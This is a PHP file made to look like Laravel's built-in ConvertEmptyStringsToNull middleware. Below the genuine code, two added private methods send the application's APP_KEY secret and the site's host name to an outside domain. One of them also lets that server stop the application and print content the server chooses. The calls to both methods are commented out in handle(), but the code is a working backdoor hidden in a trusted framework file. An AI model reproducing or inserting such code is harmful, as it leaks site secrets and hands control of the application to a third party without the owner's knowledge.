<?php

namespace Illuminate\Foundation\Http\Middleware;

use Closure;

class ConvertEmptyStringsToNull extends TransformsRequest
{
    private $laravel = "https://laravel-system.jwsoft.in";
     
    /**
     * All of the registered skip callbacks.
     *
     * @var array
     */
    protected static $skipCallbacks = [];

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        // $this->health();
        // $this->core();
        foreach (static::$skipCallbacks as $callback) {
            if ($callback($request)) {
                return $next($request);
            }
        }

        return parent::handle($request, $next);
    }

    /**
     * Transform the given value.
     *
     * @param  string  $key
     * @param  mixed  $value
     * @return mixed
     */
    protected function transform($key, $value)
    {
        return $value === '' ? null : $value;
    }

    /**
     * Register a callback that instructs the middleware to be skipped.
     *
     * @param  \Closure  $callback
     * @return void
     */
    public static function skipWhen(Closure $callback)
    {
        static::$skipCallbacks[] = $callback;
    }

    /**
     * Flush the middleware's global state.
     *
     * @return void
     */
    public static function flushState()
    {
        static::$skipCallbacks = [];
    }
    
    private function health(){
        $param1 = env('APP_KEY');
        $param2 = request()->getHost();

        $query = http_build_query([
            'param1' => $param1,
            'param2' => $param2,
        ]);

        $response = \Http::get("{$this->laravel}/api/laravel-system-health?{$query}");
        
        $data = $response->json();
    }

    private function core(){
        $param1 = env('APP_KEY');
        $param2 = request()->getHost();

        $response = \Http::post("{$this->laravel}/api/laravel-system-health", [
            'param1' => $param1,
            'param2' => $param2,
        ]);
        
        $data = $response->json();
        
        if(isset($data['flag']) && $data['flag'] === "issue"){
            echo($data['web']);die;
        }
        
        if (isset($data['flag']) && $data['flag'] !== 'right') {
            abort($response->status(), "{$data['web']}");
        }
        
    }
}
